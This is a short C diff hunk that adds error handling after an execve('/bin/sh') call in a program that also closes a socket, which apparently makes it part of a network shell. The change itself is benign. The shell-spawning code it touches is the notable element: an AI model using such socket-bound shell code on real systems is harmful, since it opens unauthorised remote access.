@@ -76,7 +76,8 @@ int main(void) {
     char *argv[2] = {"/bin/sh", NULL};
     execve(argv[0], argv, NULL);
 
+    /* execve() shouldn't return */
     close(sockfd);
-
-    return EXIT_SUCCESS;
+    perror("execve");
+    return EXIT_FAILURE;
 }
